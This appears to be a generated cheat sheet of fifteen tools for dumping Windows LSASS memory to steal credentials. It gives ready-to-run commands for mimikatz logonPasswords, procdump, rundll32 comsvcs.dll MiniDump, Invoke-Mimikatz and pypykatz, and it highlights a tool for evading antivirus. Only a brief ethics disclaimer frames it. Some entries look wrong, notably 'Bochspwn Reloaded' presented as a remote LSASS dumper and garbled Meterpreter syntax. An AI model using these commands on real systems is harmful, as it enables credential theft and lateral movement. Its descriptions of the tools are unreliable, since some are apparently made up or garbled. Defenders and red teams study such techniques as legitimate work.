Dumping the LSASS (Local Security Authority Subsystem Service) process is a sensitive operation often associated with malicious activities, such as credential theft. However, understanding these tools is crucial for both offensive and defensive security measures. Below are some well-known tools that can be used to dump LSASS memory:

### 1. **Mimikatz**
   - **Description**: A popular tool used for extracting plaintext passwords, hash, PIN codes, and Kerberos tickets from LSASS.
   - **Usage**:
     ```powershell
     mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
     ```
   - **Notes**: Mimikatz can be detected by antivirus software, and running it might require administrative privileges.

### 2. **Task Manager**
   - **Description**: The built-in Windows Task Manager can dump LSASS as a .dmp file, which can be analyzed later.
   - **Usage**:
     1. Open Task Manager.
     2. Find the `lsass.exe` process.
     3. Right-click and select **Create Dump File**.
     4. The dump will be saved to the `%TEMP%` directory.

### 3. **Procdump**
   - **Description**: A Sysinternals tool by Microsoft designed for monitoring and generating crash dumps.
   - **Usage**:
     ```powershell
     procdump.exe -ma lsass.exe lsass.dmp
     ```
   - **Notes**: Procdump has a built-in check to prevent dumping LSASS unless a special flag is used.

### 4. **MiniDumpWriteDump API**
   - **Description**: This Windows API can be invoked from a custom script or executable to generate a dump of LSASS.
   - **Usage**:
     - Can be used within a custom tool to call the `MiniDumpWriteDump` function.
   - **Notes**: Often used in custom malware or penetration testing tools.

### 5. **Sysinternals Process Explorer**
   - **Description**: Another tool from Sysinternals, Process Explorer can also dump LSASS memory.
   - **Usage**:
     1. Open Process Explorer.
     2. Find `lsass.exe` in the process list.
     3. Right-click and choose **Create Dump** > **Create Full Dump**.
   - **Notes**: Like Task Manager, this method generates a dump that can be analyzed post-exploitation.

### 6. **Windows Debugger (WinDbg)**
   - **Description**: A powerful debugger that can be used to attach to LSASS and dump its memory.
   - **Usage**:
     ```shell
     .dump /ma C:\path\to\lsass.dmp
     ```
   - **Notes**: Requires debugging symbols and a bit more expertise to use effectively.

### 7. **rundll32 with Comsvcs.dll**
   - **Description**: This method uses the `rundll32` command to dump LSASS.
   - **Usage**:
     ```powershell
     rundll32.exe comsvcs.dll, MiniDump  <PID_of_lsass> C:\path\to\dump.dmp full
     ```
   - **Notes**: This method is commonly used because it is quick and uses built-in Windows functionality.

### 8. **Out-Minidump (PowerShell)**
   - **Description**: A PowerShell script that wraps around the `MiniDumpWriteDump` API.
   - **Usage**:
     ```powershell
     Out-Minidump -ProcessName lsass -DumpFilePath C:\path\to\dump.dmp
     ```
   - **Notes**: Useful for red team operations where PowerShell is the primary tool.

### 9. **Meterpreter (Metasploit)**
   - **Description**: The `mimikatz` extension within Meterpreter can be used to dump LSASS.
   - **Usage**:
     ```shell
     load mimikatz
     mimikatz_command -f sekurlsa::minidump
     ```
   - **Notes**: Requires a successful exploit of the target machine.

### 10. **SharpDump**
   - **Description**: A C# tool that uses `MiniDumpWriteDump` to create an LSASS dump.
   - **Usage**:
     - Can be run on a target with a compiled binary.
   - **Notes**: Often used in red team engagements.

### 11. **Pypykatz**
   - **Description**: A Python implementation of Mimikatz that can parse LSASS memory dumps offline.
   - **Usage**:
     ```bash
     pypykatz lsa minidump <lsass.dmp>
     ```
   - **Notes**: Useful when you have the LSASS dump and want to parse it offline.

### 12. **Nanodump**
   - **Description**: A smaller and stealthier alternative to Mimikatz, focused solely on dumping LSASS.
   - **Usage**:
     ```shell
     nanodump.exe
     ```
   - **Notes**: Designed to bypass detection and prevent triggering anti-virus software.

### 13. **Bochspwn Reloaded**
   - **Description**: A Linux-based framework capable of dumping LSASS over the network.
   - **Usage**:
     - Requires advanced setup and is used mainly for remote LSASS dumping in penetration tests.

### 14. **Gsecdump**
   - **Description**: An older tool similar to Mimikatz for dumping LSASS.
   - **Usage**:
     ```shell
     gsecdump.exe
     ```
   - **Notes**: Less commonly used due to advancements in tools like Mimikatz.

### 15. **Empire**
   - **Description**: A post-exploitation framework with a module for dumping LSASS.
   - **Usage**:
     ```shell
     Invoke-Mimikatz -DumpCreds
     ```
   - **Notes**: Part of the PowerShell Empire framework, useful in PowerShell-based engagements.

### Ethical Considerations
Using these tools to dump LSASS in an unauthorized manner is illegal and unethical. Always ensure you have explicit permission to test or access a system before using these techniques. For legitimate use, such as malware analysis or incident response, make sure you comply with all relevant laws and organizational policies.
